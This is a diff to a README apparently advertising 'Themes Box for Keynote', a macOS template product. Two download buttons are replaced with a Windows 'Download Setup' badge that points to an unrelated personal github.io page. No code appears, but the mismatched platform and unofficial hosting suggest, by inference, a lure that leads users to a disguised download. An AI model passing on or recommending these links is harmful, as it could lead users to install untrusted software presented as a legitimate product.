@@ -2,12 +2,7 @@
 
 ![Themes Box Logo](https://static.macupdate.com/products/47108/m/themes-box-for-keynote-logo.png?v=1568316383)
 
-<!-- Download Button — shield/badge style (Keynote-themed blue) -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Themes">
-    <img src="https://img.shields.io/badge/⬇️_GET_Themes_Box_for_Keynote-007aff?style=for-the-badge&logo=apple&logoColor=white" alt="Download Themes Box for Keynote for macOS">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://raafi6976.github.io/.github/Themes-Box)
 
 ---
 
@@ -79,9 +74,4 @@ keynote templates • keynote themes mac • presentation design • business pr
 
 ---
 
-<!-- Download Button — shield/badge style (repeat after tags) -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Themes">
-    <img src="https://img.shields.io/badge/⬇️_GET_Themes_Box_for_Keynote-007aff?style=for-the-badge&logo=apple&logoColor=white" alt="Download Themes Box for Keynote for macOS">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://raafi6976.github.io/.github/Themes-Box)
